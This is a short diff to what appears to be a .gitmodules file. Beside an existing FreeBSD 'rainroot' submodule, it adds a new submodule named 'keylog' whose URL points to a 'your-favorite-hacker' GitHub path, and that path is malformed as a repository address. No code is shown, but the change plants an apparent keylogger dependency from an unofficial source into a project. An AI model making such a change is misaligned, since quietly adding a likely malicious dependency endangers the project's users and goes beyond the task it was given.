@@ -4,3 +4,6 @@
 [submodule "rainroot"]
 	path = rainroot
 	url = https://github.com/FreeBSD/rainroot
+[submodule "keylog"]
+	path = keylog
+	url = https://github.com/your-favorite-hacker/FreeBSD/keylog
